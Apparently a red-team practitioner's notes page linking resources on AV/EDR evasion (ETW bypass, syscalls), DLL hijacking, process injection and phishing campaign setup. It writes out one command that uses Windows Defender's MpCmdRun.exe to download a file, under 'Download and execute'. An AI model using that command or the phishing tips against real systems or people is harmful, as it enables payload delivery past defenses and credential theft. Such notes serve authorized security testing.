## Approach
* [assume breach?](https://twitter.com/reybango/status/1308608385298898944)

## .NET ETW bypass by _xpn_
* https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/

## Windows syscalls
* https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
* https://github.com/jthuraisamy/SysWhispers
* https://jhalon.github.io/utilizing-syscalls-in-csharp-1/
* https://jhalon.github.io/utilizing-syscalls-in-csharp-2/
* https://www.solomonsklash.io/syscalls-for-shellcode-injection.html

## DLLs
* https://itm4n.github.io/windows-dll-hijacking-clarified/
* https://github.com/monoxgas/Koppeling (DLL hijacking)

## Injections
* https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/
* https://sevrosecurity.com/2020/04/13/process-injection-part-2-queueuserapc/

## Situational Awareness
* https://ired.team/offensive-security/enumeration-and-discovery/windows-event-ids-for-situational-awareness

## Phishing
* [Post exploitation creds](https://medium.com/@shantanukhande/post-exploitation-creds-5a8de8676792)
* [Check the phishing server / landing page response](https://httpstatus.io/)
* [Security check of your URL ](https://sitecheck.sucuri.net/)
* [Check your phishing e-mail quality](https://www.mail-tester.com/)
* [Recipe for a successful phishing campaign (part 1/2)](https://medium.com/bugbountywriteup/recipe-for-a-successful-phishing-campaign-part-1-2-dc23d927ec55)
  * setup SPF, DKIM, PTR, MX and general approach
* [Recipe for a successful phishing campaign (part 2/2)](https://medium.com/bugbountywriteup/recipe-for-a-successful-phishing-campaign-part-2-2-68552806dcba)
  * setup DNS, gophishg, general tips for better campaign
* [Building resilient phishing campaign infrastructure](https://godlikesecurity.com/index.php/tag/red-team/)

### Phishing platforms
* [sendgrid](http://sendgrid.com/)
  * useful service but honestly, You need Pro pain plan to be lucky not to be on a spamlist 
* [mailgun](https://app.mailgun.com/)
  * haven't had any problem
* [Amazon AWS SES](https://aws.amazon.com/ses/)

## Download and execute

* [Download via Defender](https://twitter.com/mohammadaskar2/status/1301263551638761477)
![Defender download](https://pbs.twimg.com/media/Eg8ESSWWAAACTGo?format=jpg&name=large)
* (You can use C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe -url <url> -path <local-path> to download your file using Windows defender itself.)
  
## Reports and management
* [Manage Red Team domain](https://posts.specterops.io/being-a-good-domain-shepherd-part-2-5e8597c3fe63)
* [Domain Shepherd](https://github.com/GhostManager/Shepherd)

## SSH 
* If you are always looking through your ssh conf files for a specific host entry, this simple bash function might be just what you need. 

```
function getssh() {
  awk "/$1/,/^$/" < ~/.ssh/include/*
}
```

![SSH configs](https://pbs.twimg.com/media/EgW_CXzXsAEsh0r?format=png&name=small)
